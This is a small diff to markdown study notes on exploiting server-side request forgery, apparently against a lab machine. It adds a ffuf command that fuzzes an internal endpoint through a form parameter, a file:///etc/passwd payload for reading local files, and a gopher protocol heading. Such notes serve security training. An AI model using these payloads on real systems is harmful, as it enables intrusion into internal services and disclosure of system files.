@@ -20,4 +20,6 @@ Command to exploit SSRF :
 ## Exploiting SSRF
 **Accessing Restricted Endpoints** : `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80" -t 1000`
 
-**Local File Inclusion (LFI)** : `file:///etc/passwd` | 
+**Local File Inclusion (LFI)** : `file:///etc/passwd`
+
+**gopher Protocol :**  
